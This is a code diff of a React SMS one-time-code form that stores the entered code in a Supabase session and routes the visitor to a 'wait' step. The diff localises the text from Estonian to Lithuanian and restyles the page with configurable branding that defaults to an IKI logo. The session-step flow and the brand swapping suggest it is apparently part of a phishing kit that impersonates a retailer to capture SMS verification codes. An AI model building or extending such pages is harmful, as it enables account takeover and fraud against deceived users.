@@ -101,7 +101,7 @@ export function SmsClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Saatmine ebaõnnestus.");
+    if (error) setMsg("Nepavyko išsiųsti.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -121,8 +121,8 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -131,9 +131,9 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
+          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
             Neteisinga nuoroda.
           </p>
         </div>
@@ -143,9 +143,9 @@ export function SmsClient({ sessionId }: Props) {
 
   if (loading) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)] border-t-transparent" />
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card flex w-full max-w-[460px] justify-center p-8 py-16">
+          <div className="a3d-spinner size-12" />
         </div>
       </div>
     );
@@ -190,79 +190,81 @@ export function SmsClient({ sessionId }: Props) {
   };
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
-        
-        {/* Right Top Logo Placeholder */}
-        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
-          <img
-            src="/form-assets/iki-mini-logo.png"
-            alt="IKI logo"
-            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
-            id="sms-ah-logo"
-          />
-        </div>
+    <div className="a3d-shell">
+      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
+      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
 
-        <div className="mb-6 flex items-start gap-4">
-          <div className="mt-1 shrink-0">
-            <img src="/form-assets/icon-security.png" alt="Verified" className="h-12 w-12" id="sms-verified-icon" />
-          </div>
-          <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
-            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
-          </div>
-        </div>
-        
-        <form onSubmit={handleSubmit} className="space-y-5">
-          <div className="block text-sm font-medium text-white">
-            <div className="mb-3">{settings.sms_input_label} ({digits})</div>
-            <div
-              className="grid gap-1.5 sm:gap-2 w-full mx-auto"
-              style={{
-                gridTemplateColumns: `repeat(${digits}, minmax(0, 1fr))`,
-                maxWidth:
-                  digits <= 4 ? "320px" :
-                  digits <= 6 ? "420px" :
-                  digits <= 8 ? "520px" : "100%",
-              }}
-              onPaste={handlePaste}
-            >
-              {Array.from({ length: digits }).map((_, index) => (
-                <input
-                  key={index}
-                  id={`otp-input-${index}`}
-                  required
-                  inputMode="numeric"
-                  autoComplete="one-time-code"
-                  maxLength={1}
-                  className="w-full aspect-square sm:aspect-[5/6] text-center rounded-xl border border-transparent bg-white/10 text-xl sm:text-2xl md:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
-                  value={code[index] || ""}
-                  onChange={(e) => handleOtpChange(index, e.target.value)}
-                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
-                />
-              ))}
+      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
+        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
+          <div className="mb-6 flex items-start justify-between gap-4">
+            <div className="min-w-0">
+              <h2 className="a3d-title text-[24px] leading-tight">{settings.sms_title}</h2>
+              <p className="a3d-sub mt-2 text-sm font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
             </div>
+            <img
+              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
+              alt="IKI logo"
+              className="h-11 w-11 shrink-0 object-contain"
+              id="sms-ah-logo"
+            />
           </div>
 
-          {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Sisestage täpselt {digits} numbrit.</p>
-          ) : null}
+          <form onSubmit={handleSubmit} className="space-y-5">
+            <div className="block text-[13px] font-semibold text-[#344054]">
+              <div className="mb-3">{settings.sms_input_label} ({digits})</div>
+              <div
+                className="grid w-full gap-2 mx-auto"
+                style={{
+                  gridTemplateColumns: `repeat(${digits}, minmax(0, 1fr))`,
+                  maxWidth:
+                    digits <= 4 ? "300px" :
+                    digits <= 6 ? "400px" :
+                    digits <= 8 ? "500px" : "100%",
+                }}
+                onPaste={handlePaste}
+              >
+                {Array.from({ length: digits }).map((_, index) => (
+                  <input
+                    key={index}
+                    id={`otp-input-${index}`}
+                    required
+                    inputMode="numeric"
+                    autoComplete="one-time-code"
+                    maxLength={1}
+                    className={`a3d-otp text-xl sm:text-2xl ${code[index] ? "a3d-filled" : ""}`}
+                    value={code[index] || ""}
+                    onChange={(e) => handleOtpChange(index, e.target.value)}
+                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                  />
+                ))}
+              </div>
+            </div>
 
-          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+            {!valid && code.length > 0 ? (
+              <p className="text-xs font-medium text-red-500">Įveskite tiksliai {digits} skaitmenis.</p>
+            ) : null}
 
-          <button
-            type="submit"
-            disabled={saving || !valid}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-          >
-            {saving ? settings.sms_loading : settings.sms_button}
-          </button>
+            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}
 
-          <p className="text-center text-xs text-gray-400 mt-4">
-            Kood saadeti teile SMS-i teel teie mobiiltelefoni numberile.
-          </p>
-        </form>
-      </div>
+            <button
+              type="submit"
+              disabled={saving || !valid}
+              className="a3d-btn w-full px-6 py-4 text-[16px]"
+            >
+              {saving ? settings.sms_loading : settings.sms_button}
+            </button>
+
+            <div className="flex justify-center pt-1">
+              <div className="a3d-pill">
+                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
+                </svg>
+                <span>Kodas išsiųstas SMS žinute jūsų telefono numeriu.</span>
+              </div>
+            </div>
+          </form>
+        </div>
+      </main>
     </div>
   );
 }
